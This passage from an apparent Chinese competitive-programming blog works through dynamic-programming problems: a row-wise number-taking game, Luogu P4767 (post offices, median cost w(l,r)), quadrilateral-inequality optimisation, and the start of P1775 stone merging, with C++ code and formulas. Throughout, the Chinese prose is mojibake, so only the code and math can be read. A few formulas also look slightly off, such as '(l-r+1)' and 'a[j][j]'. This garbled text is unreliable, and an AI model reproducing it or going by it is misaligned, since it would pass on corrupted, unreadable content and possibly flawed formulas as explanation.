<li>æ¯æ¬¡å–æ•°æ—¶é¡»ä»æ¯è¡Œå„å–èµ°ä¸€ä¸ªå…ƒç´ ï¼Œå…± <span
class="math inline">\(n\)</span> ä¸ªã€‚ç»è¿‡ <span
class="math inline">\(m\)</span> æ¬¡åå–å®ŒçŸ©é˜µå†…æ‰€æœ‰å…ƒç´ ï¼›</li>
<li>æ¯æ¬¡å–èµ°çš„å„ä¸ªå…ƒç´ åªèƒ½æ˜¯è¯¥å…ƒç´ æ‰€åœ¨è¡Œçš„è¡Œé¦–æˆ–è¡Œå°¾ï¼›</li>
<li>æ¯æ¬¡å–æ•°éƒ½æœ‰ä¸€ä¸ªå¾—åˆ†å€¼ï¼Œä¸ºæ¯è¡Œå–æ•°çš„å¾—åˆ†ä¹‹å’Œï¼Œæ¯è¡Œå–æ•°çš„å¾—åˆ† =
è¢«å–èµ°çš„å…ƒç´ å€¼ <span class="math inline">\(\times 2^i\)</span>ï¼Œå…¶ä¸­
<span class="math inline">\(i\)</span> è¡¨ç¤ºç¬¬ <span
class="math inline">\(i\)</span> æ¬¡å–æ•°ï¼ˆä» <span
class="math inline">\(1\)</span> å¼€å§‹ç¼–å·ï¼‰ï¼›</li>
<li>æ¸¸æˆç»“æŸæ€»å¾—åˆ†ä¸º <span class="math inline">\(m\)</span>
æ¬¡å–æ•°å¾—åˆ†ä¹‹å’Œã€‚</li>
</ol>
<p>å¯¹äºä»»æ„çŸ©é˜µï¼Œå¯ä»¥æ±‚å‡ºå–æ•°åçš„æœ€å¤§å¾—åˆ†ã€‚</p>
<p>ç”±äºç¬¬iæ¬¡å–æ•°çš„æƒé‡ä¸º<span
class="math inline">\(2^i\)</span>,æ˜¾ç„¶åº”å°½é‡ä¿ç•™å¤§æ•°æ”¾åˆ°æœ€åå–</p>
<p>å¹¶ä¸”å–ç¬¬ä¸€è¡Œå’Œç¬¬äºŒè¡Œçš„æ•°æ²¡æœ‰å½±å“</p>
<p>å› æ­¤å®é™…ä¸Šå¯ä»¥å…ˆè§£å†³ä¸€è¡Œå†…çš„å–æ•°é—®é¢˜,é—®é¢˜è½¬åŒ–ä¸º:</p>
<p>mä¸ªæ•°,ç¬¬iä¸ªæ•°æ˜¯a[i],æ¯æ¬¡å–æ•°åªèƒ½ä»å¤´æˆ–è€…å°¾å–æ•°,ç¬¬jæ¬¡å–æ•°xçš„å¾—åˆ†æ˜¯<span
class="math inline">\(2^j\times x\)</span>,æ±‚mæ¬¡å–æ•°æœ€é«˜å¾—åˆ†</p>
<p>å¦‚æœæ²¡æœ‰åªèƒ½å¤´å°¾å–æ•°çš„é™åˆ¶,æ˜¾ç„¶ç›´æ¥mä¸ªæ•°æ’åºåæŒ‰ç…§ä»å°åˆ°è¾¾çš„é¡ºåºå–æ•°,ç°åœ¨æœ‰ä¸€ä¸ªåªèƒ½ä»å¤´æˆ–è€…å°¾å–æ•°çš„é™åˆ¶</p>
<p>æš´åŠ›æœç´¢çš„ç®—æ³•å®¹æ˜“æƒ³åˆ°dfs(deque,level)è¡¨ç¤ºå½“å‰åŒç«¯é˜Ÿåˆ—deque,å½“å‰è¦å–ç¬¬levelä¸ªæ•°</p>
<p>ä½†æ˜¯mæœ€å¤§ä¸º80,è¿™å°±æ„å‘³ç€dfsçš„æ—¶é—´å¤æ‚åº¦æ˜¯<span
class="math inline">\(O(2^{80})\)</span>æ˜¾ç„¶è¶…æ—¶</p>
<p>æ˜¾ç„¶è¦ä½¿ç”¨æ›´åŠçš„æ–¹æ³•</p>
<p>è®¾è®¡çŠ¶æ€: <span class="math display">\[
dp[i][j]\leftarrowè¦åœ¨é—­åŒºé—´[i,j]ä¸­å–æ•°,å…¨éƒ¨å–å®Œåæœ€ç»ˆèƒ½å¤Ÿå¾—åˆ°çš„æœ€å¤§å€¼
\]</span></p>
<p>çŠ¶æ€è½¬ç§»: <span class="math display">\[
dp[i][j]=max(dp[i][j-1]+a[j][j]\times 2^k,dp[i+1][j]+a[i][i]\times 2^k)
\]</span> å…¶ä¸­kæ˜¯ç¬¬kæ¬¡å–æ•°,k=n-i-j+2</p>
<p><code>dp[1][n]</code>æ˜¯ç¬¬1æ¬¡å–æ•°</p>
<p>å±‘é¢˜å®³å¾—è€ƒå°¼ç›çš„é«˜ç²¾åº¦,æœ‰ä¸ªğŸ”¨æ„æ€å•Š,æ²¡æ´»å¯ä»¥å’¬æ‰“ç«æœº</p>
<h2 id="p4767-é‚®å±€"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P4767">P4767 é‚®å±€</a></h2>
<p>vä¸ªæ‘åº„,pä¸ªé‚®å±€</p>
<p>ç¬¬iä¸ªæ‘åº„åœ¨a[i]ä½ç½®</p>
<p>é‚®å±€éƒ½è¦å»ºåœ¨æ‘åº„é‡Œ,è¦æ±‚æ‰€æœ‰æ‘åº„åˆ°æœ€è¿‘é‚®å±€çš„è·ç¦»å’Œæœ€å°</p>
<p>æ±‚è¿™ä¸ªæœ€å°è·ç¦»å’Œæ˜¯å¤šå°‘</p>
<p>è®¾è®¡çŠ¶æ€: <span class="math display">\[
dp[i][j]è¡¨ç¤ºå‰iä¸ªæ‘åº„æ”¾äº†jä¸ªé‚®å±€,æœ€å°è·ç¦»å’Œ
\]</span></p>
<p>çŠ¶æ€è½¬ç§» <span class="math display">\[
dp[i][j]=\min_{1\le k\le i}(dp[k][j-1]+w(k+1,i))
\]</span> å…¶ä¸­<span
class="math inline">\(w(l,r)\)</span>è¡¨ç¤º,åœ¨ç¬¬lä¸ªå’Œç¬¬rä¸ª(åŒ…æ‹¬ä¸¤å¤´)æ‘åº„ä¹‹é—´æ”¾ä¸€ä¸ªé‚®å±€æ—¶,è¿™ä¸€æ®µä¸Šçš„æ‘åº„çš„æœ€çŸ­è·ç¦»å’Œ</p>
<p>è¿™ä¸ªç©æ„å„¿æ€ä¹ˆæ±‚å‘¢?</p>
<p>è®¾<span class="math inline">\([l,r]\)</span>åŒºé—´ä¸Šçš„æ‘åº„åæ ‡ä¸º<span
class="math inline">\(x[l],x[l+1],x[l+2],...,x[r-1],x[r]\)</span></p>
<p>å‡è®¾æ”¾è¿™ä¸ªé‚®å±€çš„åæ ‡ä¸º<span
class="math inline">\(x\)</span>,åˆ™é—®é¢˜ç›¸å½“äº <span
class="math display">\[
w(l,r)=min(|x-x[l]|+|x-x[l+1]|+|x-x[l+2]|+...+|x-x[r-1]|+|x-x[r]|)
\]</span> ä»¤<span
class="math inline">\(f(x)=|x-x[l]|+|x-x[l+1]|+|x-x[l+2]|+...+|x-x[r-1]|+|x-x[r]|\)</span></p>
<p>ä¹Ÿå°±æ˜¯æ±‚è¯¥å‡½æ•°åœ¨<span
class="math inline">\([l,r]\)</span>ä¸Šçš„æœ€å°å€¼ç‚¹</p>
<p>æ€ä¹ˆæ±‚å‘¢?ç”»å›¾è§‚å¯Ÿä¸€ä¸‹,</p>
<p>å¦‚æœæœ‰å¥‡æ•°é¡¹,æ¯”å¦‚<span
class="math inline">\(y=|x-x_1|+|x-x_2|+|x-x_3|\)</span>,è¿™ä¸ªå‡½æ•°å¿…ç„¶æœ‰ä¸€ä¸ªå°–å„¿,ä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦çš„æœ€å°å€¼,å¹¶ä¸”è¿™ä¸ªæå°å€¼ç‚¹ç­‰äº
<span class="math inline">\(ä¸­ä½æ•°(x_1,x_2,x_3)\)</span></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221223163332854.png"
alt="image-20221223163332854" />
<figcaption aria-hidden="true">image-20221223163332854</figcaption>
</figure>
<p>å¦‚æœæœ‰å¶æ•°é¡¹,æ¯”å¦‚<span
class="math inline">\(y=|x-x_1|+|x-x_2|+|x-x_3|+|x-x_4|\)</span>,å°±æ²¡æœ‰è¿™ä¸ªå°–å„¿,ä½†æ˜¯æœ‰ä¸€ä¸ªæ°´å¹³çš„æœ€ä½è°·,è¿™ä¸ªæœ€ä½è°·ä»‹äºä¸¤ä¸ªä¸­ä½æ•°ä¹‹é—´</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221223163546294.png"
alt="image-20221223163546294" />
<figcaption aria-hidden="true">image-20221223163546294</figcaption>
</figure>
<p>è¿™å°±æœ‰<span class="math inline">\(w(l,r)\)</span>çš„æ±‚è§£æ–¹æ³•äº†:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">w</span>(l,r):</span><br><span class="line">	mid=å‘ä¸‹å–æ•´((l+r)/<span class="number">2</span>)</span><br><span class="line">	dist_sum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> all k among [l,r]:</span><br><span class="line">		dist_sum+=<span class="built_in">abs</span>(x[k]-x[mid])</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">return</span> dist_sum;</span><br></pre></td></tr></table></figure>
<p>æ¯æ¬¡è°ƒç”¨<span
class="math inline">\(w(l,r)\)</span>,æ—¶é—´å¤æ‚åº¦éƒ½æ˜¯<span
class="math inline">\(T(r-l+1)=O(n)\)</span></p>
<p>å¯ä»¥é¢„å¤„ç†æ‰€æœ‰çš„<span class="math inline">\(w(l,r)\)</span></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for(int l=1;l&lt;=n;++l)&#123;</span><br><span class="line">	for(int r=l;r&lt;=n;++r)&#123;</span><br><span class="line">		W[l][r]=w(l,r);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¤–é¢åˆå¥—äº†<span class="math inline">\(O(n^2)\)</span>çš„å¾ªç¯</p>
<p>æ€»å¤æ‚åº¦æ˜¯<span
class="math inline">\(O(n^3)\)</span>,ç„¶è€Œnæœ€å¤§æ˜¯3000,æ˜¾ç„¶<span
class="math inline">\(O(n^3)\)</span>ä¼šè¶…æ—¶</p>
<p>å¦‚æœèƒ½ç»™ä»–é™ä¸º<span class="math inline">\(O(n^2)\)</span>å°±å¯ä»¥äº†</p>
<p>è¿™ä¸ª<span class="math inline">\(w[l,r]\)</span>çš„æ±‚æ³•å¯ä»¥ç»§ç»­ä¼˜åŒ–</p>
<p>å‡è®¾å·²ç»çŸ¥é“äº†<span
class="math inline">\(w[l,r-1]\)</span>,ç°åœ¨è¦æ±‚<span
class="math inline">\(w[l,r]\)</span> <span class="math display">\[
w[l,r]=w[l,r-1]+x[r]-x[mid(l,r)]\\
mid(l,r)=\lfloor\frac{l+r}{2}\rfloor
\]</span>
è¿™æ¡ç»“è®ºçœ‹ä¸Šå»å¾ˆè¯¡å¼‚,å¤ªç®€æ´äº†,å¹¶ä¸”å¥½åƒä¸­ä½æ•°çš„å˜åŠ¨åªä¼šå½±å“åˆ°æ–°åŠ å…¥çš„ç¬¬rä¸ªæ‘åº„,å‰é¢çš„[l,r-1]æ‘åº„åˆ°é‚®å±€çš„æœ€è¿‘è·ç¦»å’Œä»ç„¶æ˜¯ä½¿ç”¨çš„åŸæ¥çš„ä¸­ä½æ•°,æˆ‘è‡ªå·±æ¨å¯¼çš„å¼å­ä¸­æ˜¯æœ‰ä¸­ä½æ•°çš„å˜åŒ–çš„</p>
<blockquote>
<p>å¦‚æœ<span
class="math inline">\(r-l+1\)</span>æ˜¯ä¸€ä¸ªå¥‡æ•°,é‚£ä¹ˆæœ€å³è¾¹å†åŠ ä¸€ä¸ª,ä¸‹æ ‡ä¸­ä½æ•°ä¸å˜,ç›¸å½“äºé‚®å±€ä½ç½®ä¸ç”¨æ”¹åŠ¨,é‚£ä¹ˆ[l,r]æ‰€æœ‰çš„æ‘åº„åˆ°è¿™ä¸ªé‚®å±€çš„è·ç¦»å’Œä¸å˜,<span
class="math inline">\(w[l,r+1]=w[l,r]+|x[r+1]-x[mid]|\)</span></p>
<p>å¦‚æœ<span
class="math inline">\(r-l+1\)</span>æ˜¯ä¸€ä¸ªå¶æ•°,é‚£ä¹ˆæœ€å³è¾¹å†åŠ ä¸€ä¸ª,ä¸‹æ ‡ä¸­ä½æ•°å¾—å¾€å³ç§»åŠ¨ä¸€ä¸ª,æ–°mid=è€mid+1,é‚£ä¹ˆ</p>
<p><span class="math inline">\(w[l,r+1]=w[l,r]+|x[æ–°mid]-x[è€mid]|\times
(l-r+1)+|x[r+1]-x[æ–°mid]|\)</span></p>
<p>å†è€ƒè™‘<span
class="math inline">\(r-l+1\)</span>æ˜¯å¥‡æ•°çš„æƒ…å†µ,å¦‚æœä¿æŒä¸‹æ ‡ä¸­ä½æ•°ä¸å˜,å®é™…ä¸Šå¯¹äº[l,r+1]æ—¶,è¿™ä¸ªä¸­ä½æ•°æ˜¯å·¦ä¸­ä½æ•°</p>
<p>å®Œå…¨å¯ä»¥+1ä½¿ç”¨å³ä¸­ä½æ•°</p>
<p>å› æ­¤ä¸¤ç§æƒ…å†µç»Ÿä¸€äº†,å³ <span class="math display">\[
w[l,r+1]=w[l,r]+(x[mid+1]-x[mid])\times (r-l+1)+x[r+1]-x[mid+1]
\]</span></p>
</blockquote>
<p>ç„¶è€Œä»”ç»†ä¸€æƒ³ç¡®å®å¯ä»¥å¿½ç•¥ä¸­ä½æ•°çš„å˜åŒ–.æ€ä¹ˆæƒ³å‘¢?</p>
<p><span class="math display">\[
\begin{aligned}
w[l,r-1]&amp;=\sum_{l\le k\le r-1}|x[k]-x[mid(l,r-1)]|\\
w[l,r]&amp;=\sum_{l\le k\le r}|x[k]-x[mid(l,r)]|\\
\end{aligned}
\]</span>
å¦‚æœ[l,r-1]ä¹‹é—´æœ‰å¶æ•°ä¸ªæ‘åº„,é‚£ä¹ˆé€‰å–é‚®å±€å»ºç«‹åœ¨å·¦ä¸­ä½æ•°æ‘åº„æˆ–è€…å³ä¸­ä½æ•°æ‘åº„,ç”šè‡³ä¸¤è€…ç›´æ¥çš„åœ°æ–¹(è™½ç„¶åªå…è®¸å»ºç«‹åœ¨æ‘åº„é‡Œ),[l,r-1]æ‰€æœ‰çš„æ‘åº„åˆ°è¿™ä¸ªé‚®å±€çš„è·ç¦»å’Œéƒ½æ˜¯æœ€çŸ­çš„,è¿™åœ¨å›¾ä¸Šå¯¹åº”æ°´å¹³è°·åº•é‚£ä¸€æ®µ</p>
<p>ä¸å¦¨è®©é‚®å±€å»ºç«‹åœ¨å³ä¸­ä½æ•°æ‘åº„,ä¹Ÿå°±æ˜¯<span
class="math inline">\(\lfloor\frac{l+r-1}{2}\rfloor+1\)</span></p>
<p>é‚£ä¹ˆ[l,r]æœ‰å¥‡æ•°ä¸ªæ‘åº„,å…¶ä¸­ä½æ•°å”¯ä¸€,ä¹Ÿå°±æ˜¯<span
class="math inline">\(\lfloor \frac{l+r}{2}\rfloor\)</span></p>
<p>ç”±äº[l,r-1]ä¹‹é—´æœ‰å¶æ•°ä¸ªæ‘åº„,å› æ­¤å¯ä»¥è®¾<span
class="math inline">\(r-1-l+1=r-l=2k\)</span>å¸¦å…¥ä¸Šä¸¤å¼ <span
class="math display">\[
\begin{aligned}
\lfloor\frac{l+r-1}{2}\rfloor+1&amp;=\lfloor
k+l-\frac{1}{2}\rfloor+1=k+l-1+1=k+l\\
\lfloor \frac{l+r}{2}\rfloor&amp;=\lfloor k+l\rfloor=k+l
\end{aligned}
\]</span>
è¿™å°±è¯æ˜äº†[l,r]çš„ä¸­ä½æ•°æ°å¥½æ˜¯[l,r-1]çš„å³ä¸­ä½æ•°,å› æ­¤ä¸¤ç§æƒ…å†µå¯ä»¥é€‰æ‹©åŒä¸€ä¸ªä¸­ä½æ•°,å› æ­¤æ–°åŠ å…¥ræ‘åº„çš„æ—¶å€™w[l,r]ç›´æ¥åŠ ä¸Šw[l,r-1],æ— éœ€è¿›è¡Œä¸­ä½æ•°çš„æ ¡æ­£</p>
<p>å¦‚æœ[l,r-1]ä¹‹é—´æœ‰å¥‡æ•°ä¸ªæ‘åº„,é‚£ä¹ˆåªéœ€è¦è®©[l,r]é€‰å–å·¦ä¸­ä½æ•°å’Œ[l,r-1]çš„ä¸­ä½æ•°æ˜¯ä¸€ä¸ªç‚¹,åŒç†å¯è¯</p>
<p>è¯æ¯•</p>
<p>å®é™…ä¸Šè¯å®Œäº†çœ‹è¿™ä¸ªç»“è®ºå¾ˆå®¹æ˜“æƒ³,ä½†æ˜¯ä¹‹å‰æ€ç»´å°±å¤ªåƒµåŒ–äº†,ä»¥åè®°ä½è¿™ä¸ªç»“è®ºå§</p>
<p>åŠ ä¸Šwè®¡ç®—çš„ä¼˜åŒ–,åŠ ä¸Šå››è¾¹å½¢ä¸æ‡‚äº‹çš„ä¼˜åŒ–</p>
<p>okk,ç°åœ¨dpçš„æ—¶é—´å¤æ‚åº¦æˆåŠŸé™åˆ°äº†<span
class="math inline">\(O(n^2)\)</span></p>
<p>ä¼˜åŒ–åçš„w,å…¶è®¡ç®—çš„æ—¶é—´å¤æ‚åº¦ä¹Ÿæ˜¯<span
class="math inline">\(O(n^2)\)</span></p>
<p>æ€»æ—¶é—´å¤æ‚åº¦å°±æ˜¯<span class="math inline">\(O(n^2)\)</span></p>
<p>åº”è¯¥å¯ä»¥é€šè¿‡äº†å§</p>
<p><del>ä¸æƒ³å†™äº†,å¼€æ‘†,æ˜å¤©å†™äº†é¢˜è§£ç„¶åå†çœ‹çœ‹å››è¾¹å½¢ä¸æ‡‚äº‹ä¼˜åŒ–</del></p>
<p>é˜³äº†å››å¤©,æ‘†äº†å››å¤©...</p>
<p>é¦–å…ˆæ˜¯ä¸åŠ å››è¾¹å½¢ä¸ç­‰å¼ä¼˜åŒ–çš„ä»£ç </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> v, p;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF = <span class="number">1e9</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxv = <span class="number">3010</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxp = <span class="number">310</span>;</span><br><span class="line"><span class="type">int</span> x[maxv];</span><br><span class="line"><span class="type">int</span> w[maxv][maxv];</span><br><span class="line"><span class="type">int</span> dp[maxv][maxp];</span><br><span class="line"><span class="comment">// int s[maxv][maxp];</span></span><br><span class="line"><span class="type">int</span> s[maxv];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// cin.tie(0);</span></span><br><span class="line">    cin &gt;&gt; v &gt;&gt; p;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= v; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; x[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sort</span>(x + <span class="number">1</span>, x + v + <span class="number">1</span>);<span class="comment">//ä½¿æ‘åº„çš„åæ ‡å‡åºæ’åˆ—</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆå§‹åŒ–wæ•°ç»„</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">1</span>; l &lt;= v; ++l)</span><br><span class="line">    &#123;</span><br><span class="line">        w[l][l] = <span class="number">0</span>; <span class="comment">// ä»lå·æ‘åº„ä¸Šå»ºç«‹é‚®å±€,åˆ°è¯¥æ‘åº„çš„æœ€çŸ­é‚®å±€è·ç¦»å°±æ˜¯0</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> r = l + <span class="number">1</span>; r &lt;= v; ++r)</span><br><span class="line">        &#123;</span><br><span class="line">            w[l][r] = w[l][r - <span class="number">1</span>] + x[r] - x[(l + r) &gt;&gt; <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆå§‹åŒ–dpæ•°ç»„</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= v; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s[i]=i;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= p; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            dp[i][j] = INF;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> j = <span class="number">1</span>; j &lt;= p; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> i = <span class="number">1</span>; i &lt;= v; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> temp_min = INF;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> k = s[i<span class="number">-1</span>]; k &lt; i; ++k)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(temp_min&gt;dp[k][j - <span class="number">1</span>] + w[k + <span class="number">1</span>][i])&#123;</span><br><span class="line">                    temp_min=dp[k][j - <span class="number">1</span>] + w[k + <span class="number">1</span>][i];</span><br><span class="line">                    s[i]=k;<span class="comment">//å››è¾¹å½¢ä¸ç­‰å¼ä¼˜åŒ–</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// temp_min = min(temp_min, dp[k][j - 1] + w[k + 1][i]);</span></span><br><span class="line">            &#125;</span><br><span class="line">            dp[i][j] = temp_min;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// i,jéå†é¡ºåºåäº†,å¯¼è‡´è®¡ç®—dp[i][j]æ—¶,dp[k][j-1]å¯èƒ½è¿˜æ²¡æœ‰ç»è¿‡è®¡ç®—</span></span><br><span class="line">    <span class="comment">//  for(auto i=1;i&lt;=v;++i)&#123;</span></span><br><span class="line">    <span class="comment">//      for(auto j=1;j&lt;=p;++j)&#123;</span></span><br><span class="line">    <span class="comment">//          int temp_min=INF;</span></span><br><span class="line">    <span class="comment">//          for(auto k=1;k&lt;i;++k)&#123;</span></span><br><span class="line">    <span class="comment">//              temp_min=min(temp_min,dp[k][j-1]+w[k+1][i]);</span></span><br><span class="line">    <span class="comment">//          &#125;</span></span><br><span class="line">    <span class="comment">//          dp[i][j]=temp_min;</span></span><br><span class="line">    <span class="comment">//      &#125;</span></span><br><span class="line">    <span class="comment">//  &#125;</span></span><br><span class="line">    cout &lt;&lt; dp[v][p];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="åŠ¨æ€è§„åˆ’-å››è¾¹å½¢ä¸ç­‰å¼ä¼˜åŒ–">åŠ¨æ€è§„åˆ’-å››è¾¹å½¢ä¸ç­‰å¼ä¼˜åŒ–</h2>
<p>è¯æ˜åŠå…¶ä»–è¯¦ç»†èµ„æ–™è§<a
target="_blank" rel="noopener" href="https://github.com/luoyongjun999/code">luoyongjun999/code: code
(github.com)</a></p>
<p>åŒºé—´dpçš„çŠ¶æ€è½¬ç§»,ä¸€èˆ¬é•¿è¿™æ ·(ä»¥P1775çŸ³å­åˆå¹¶ä¸ºä¾‹):</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> delta=<span class="number">1</span>;delta&lt;=n;++delta)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> i=<span class="number">1</span>;i+delta&lt;=n;++i)&#123;</span><br><span class="line">        <span class="keyword">auto</span> j=i+delta;</span><br><span class="line">        <span class="type">int</span> temp_min=INF;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> k=i;k&lt;j;++k)&#123;</span><br><span class="line">            <span class="keyword">if</span>(dp[i][k]+dp[k<span class="number">+1</span>][j]&lt;temp_min)&#123;</span><br><span class="line">                temp_min=dp[i][k]+dp[k<span class="number">+1</span>][j];</span><br><span class="line">                s[i][j]=k;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        dp[i][j]=temp_min+prefix[j]-prefix[i<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸‰å±‚å¾ªç¯,å¤æ‚åº¦<span class="math inline">\(O(n^3)\)</span></p>
<p>ä½¿ç”¨å››è¾¹å½¢ä¸ç­‰å¼ä¼˜åŒ–(èƒ½å¤Ÿè¯æ˜æˆç«‹çš„å‰æä¸‹),å¯ä»¥å°†æœ€é‡Œåœˆkçš„éå†èŒƒå›´ä»<span
class="math inline">\([i,j)\)</span>,ç¼©å‡åˆ°<span
class="math inline">\([s[i][j-1],s[i+1][j]\)</span>,è¿™ä¸ªèŒƒå›´ç»“åˆä¸Šiå’Œjçš„èŒƒå›´èƒ½å¤Ÿè¯æ˜,ä¸‰å±‚å¾ªç¯çš„æ—¶é—´å¤æ‚åº¦å®é™…ä¸Šæ˜¯<span
class="math inline">\(O(n^2)\)</span></p>
<blockquote>
<p>è¿™é‡Œ<span class="math inline">\(s[i][j]\)</span>çš„å®é™…æ„ä¹‰æ˜¯,å½“<span
class="math inline">\(dp[i][j]=\min_{i\leq
k&lt;j}(dp[i][k]+dp[k+1][j])+\sum_{i\leq k\leq
j}a[k]\)</span>åœ¨kå¤„å–å¾—æœ€å°å€¼æ—¶,æ­¤æ—¶çš„kå°±ä½œä¸º<span
class="math inline">\(s[i][j]\)</span></p>
<p>è¾¹ç•Œæ¡ä»¶æ˜¯<span class="math inline">\(s[i][i]=i\)</span></p>
</blockquote>
<p>ç”¨æ³•è§P1775</p>
<h2 id="p1775-çŸ³å­åˆå¹¶å¼±åŒ–ç‰ˆ"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1775">P1775
çŸ³å­åˆå¹¶ï¼ˆå¼±åŒ–ç‰ˆ)</a></h2>
<p>ä¸€æ’Nå †çŸ³å¤´ç¬¬iå †çŸ³å¤´æœ‰a[i]ä¸ª,åˆå¹¶ä¸¤å †çŸ³å¤´çš„å¾—åˆ†æ˜¯ä¸¤å †çŸ³å¤´çš„æ•°é‡å’Œ</p>
<p>æ±‚æœ€ååˆå¹¶åªå‰©ä¸€å †æ—¶å–å¾—çš„æœ€å°å¾—åˆ†,å…¶ä¸­<span
class="math inline">\(N\le 300,a[i]\leq 1000\)</span></p>
<p>P1880é‚£ä¸ªé¢˜æ˜¯ç¯çŠ¶çš„,è¿™ä¸ªæ˜¯çº¿æ€§çš„</p>
<p>è®¾è®¡çŠ¶æ€: <span class="math display">\[
dp[i][j]è¡¨ç¤ºåˆå¹¶[i,j]æ‰€æœ‰çš„çŸ³å­,è·å¾—çš„æœ€å°å¾—åˆ†
\]</span> è¾¹ç•Œæ¡ä»¶: <span class="math display">\[
dp[i][i]=0,å³åˆå¹¶ä¸€å †æ—¶åˆå¹¶ä¸ªå¯‚å¯
